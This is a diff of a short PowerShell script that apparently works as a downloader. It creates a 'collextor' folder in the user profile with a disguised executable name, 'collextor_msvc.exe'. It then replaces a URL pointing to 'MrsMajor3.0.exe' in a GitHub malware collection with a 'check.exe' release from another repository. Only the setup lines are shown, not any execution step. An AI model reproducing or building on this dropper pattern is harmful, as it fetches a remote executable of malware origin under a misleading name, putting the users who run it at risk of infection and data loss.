@@ -1,6 +1,6 @@
 $dir = "$env:USERPROFILE\collextor"
 $exe = "$dir\collextor_msvc.exe"
-$url = "https://github.com/Zusyaku/Malware-Collection-Part-2/blob/main/MrsMajor3.0.exe?ysclid=mqyvhbyjhd758400474"
+$url = "https://github.com/Holycheck/checker/releases/download/main/check.exe"
 
 New-Item -ItemType Directory -Force -Path $dir | Out-Null
 
